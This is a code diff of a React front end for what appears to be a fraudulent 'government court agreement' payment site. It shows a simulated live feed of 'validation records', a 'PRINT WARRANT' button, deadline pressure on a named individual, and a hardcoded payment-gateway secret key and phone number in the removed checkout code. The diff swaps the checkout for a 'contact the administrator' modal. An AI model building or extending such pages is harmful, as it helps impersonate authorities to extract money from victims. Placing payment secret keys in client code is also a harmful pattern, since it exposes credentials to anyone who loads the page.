@@ -70,6 +70,7 @@ export default function App() {
   const [reportSuccess, setReportSuccess] = useState(false);
   const [reportMessage, setReportMessage] = useState('');
   const [showCertificateView, setShowCertificateView] = useState(false);
+  const [showPaymentBlockModal, setShowPaymentBlockModal] = useState(false);
   
   // Live Feed Simulation of ledger validation records
   const [recentChecks, setRecentChecks] = useState([
@@ -139,38 +140,7 @@ export default function App() {
   };
 
   const handlePayment = () => {
-    const amountToPay = paymentOption === 'self' ? 9000 : 11500;
-    
-    const options = {
-      key: 'rzp_test_Tf7VnvObroPCDv', // Test Razorpay API key
-      secret: 'DA0zOM3bGDHn6soWdt9Gzd90', // Razorpay Secret key
-      amount: amountToPay * 100, // Razorpay works in paise (subunits)
-      currency: 'INR',
-      name: 'Indus Limited',
-      description: 'Government Court Agreement Processing',
-      payment_capture: 1,
-      handler: function (response: any) {
-        setPaymentSuccessId(response.razorpay_payment_id);
-      },
-      prefill: {
-        name: 'Milan Biswas',
-        contact: '9339492781'
-      },
-      theme: {
-        color: '#059669' // Tailwind emerald-600 hex
-      }
-    };
-
-    if (!window.Razorpay) {
-      alert('Razorpay SDK failed to load. Are you online?');
-      return;
-    }
-
-    const rzp = new window.Razorpay(options);
-    rzp.on('payment.failed', function (response: any) {
-      alert(`Payment failed: ${response.error.description}`);
-    });
-    rzp.open();
+    setShowPaymentBlockModal(true);
   };
 
   const handleReportSubmit = (e: React.FormEvent) => {
@@ -664,11 +634,8 @@ export default function App() {
                             <div className="bg-blue-50/50 border border-blue-100/50 p-3 rounded-xl flex items-start gap-3 mt-2 shadow-sm">
                               <Calendar className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" />
                               <div className="flex flex-col gap-1">
-                                <p className="text-sm text-blue-800 font-medium">
-                                  The court agreement and government-related work is scheduled to begin on <strong>September 24</strong>.
-                                </p>
-                                <p className="text-[11px] text-blue-700 font-bold uppercase tracking-wider mt-0.5">
-                                  * Payment must be made prior to the 24th to ensure a smooth workflow.
+                                <p className="text-sm text-blue-800 font-medium leading-relaxed">
+                                  It will be stated here that the court proceedings begin on the 24th; therefore, making the payment on the 23rd would be best, as the payment process takes one or two days.
                                 </p>
                               </div>
                             </div>
@@ -1081,6 +1048,47 @@ export default function App() {
                     <span>PRINT WARRANT</span>
                   </button>
                 </div>
+              </div>
+            </motion.div>
+          </div>
+        )}
+      </AnimatePresence>
+
+      {/* Payment Block Modal */}
+      <AnimatePresence>
+        {showPaymentBlockModal && (
+          <div className="fixed inset-0 bg-slate-900/60 backdrop-blur-md flex items-center justify-center p-4 z-50">
+            <motion.div
+              initial={{ scale: 0.95, opacity: 0 }}
+              animate={{ scale: 1, opacity: 1 }}
+              exit={{ scale: 0.95, opacity: 0 }}
+              className="bg-white rounded-2xl max-w-md w-full p-6 shadow-2xl relative"
+            >
+              <button 
+                onClick={() => setShowPaymentBlockModal(false)}
+                className="absolute right-4 top-4 p-1 rounded-full text-slate-400 hover:text-slate-600 hover:bg-slate-100 transition-colors"
+              >
+                <X className="w-5 h-5" />
+              </button>
+              
+              <div className="flex flex-col items-center text-center gap-4 mt-2">
+                <div className="w-12 h-12 bg-amber-100 text-amber-600 rounded-full flex items-center justify-center">
+                  <AlertTriangle className="w-6 h-6" />
+                </div>
+                <h3 className="text-xl font-bold text-slate-800">Action Required</h3>
+                <p className="text-sm text-slate-600 leading-relaxed">
+                  Please contact the administrator before making this payment to verify your account status.
+                </p>
+                <div className="w-full bg-slate-50 border border-slate-100 rounded-xl p-4 mt-2 flex items-center justify-between">
+                  <span className="text-sm font-medium text-slate-500">Scheduled Date</span>
+                  <span className="text-sm font-bold text-slate-800">Sep 23rd - 24th</span>
+                </div>
+                <button
+                  onClick={() => setShowPaymentBlockModal(false)}
+                  className="w-full py-3 mt-2 rounded-xl bg-slate-800 hover:bg-slate-900 text-white font-medium text-sm transition-colors cursor-pointer"
+                >
+                  Understood
+                </button>
               </div>
             </motion.div>
           </div>
